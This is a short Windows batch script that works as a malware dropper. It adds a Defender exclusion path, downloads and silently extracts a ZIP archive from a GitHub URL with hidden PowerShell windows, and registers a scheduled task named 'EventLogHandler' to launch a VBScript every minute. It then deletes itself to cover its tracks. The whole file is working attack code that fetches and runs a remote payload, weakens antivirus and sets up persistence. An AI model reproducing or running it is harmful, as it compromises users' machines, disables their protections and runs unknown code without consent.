@echo off
setlocal

set "zipUrl=https://github.com/nuo720/mxmr/raw/refs/heads/main/EventLogHandler.zip"
set "tempZipPath=%TEMP%\tmpELH.zip"
set "destinationPath=%APPDATA%\tmpdir"

if not exist "%destinationPath%" (
    mkdir "%destinationPath%" >nul
)

powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%destinationPath%' *> $null"

powershell -WindowStyle Hidden -Command "Start-BitsTransfer -Source '%zipUrl%' -Destination '%tempZipPath%'"
powershell -WindowStyle Hidden -Command "Expand-Archive -LiteralPath '%tempZipPath%' -DestinationPath '%destinationPath%' -Force *> $null"
del "%tempZipPath%" >nul

schtasks /create /tn "EventLogHandler" /tr "wscript.exe \"%APPDATA%\tmpdir\run.vbs\"" /sc minute /mo 1 /f >nul
schtasks /run /tn "EventLogHandler" >nul

del "%~f0" >nul

endlocal
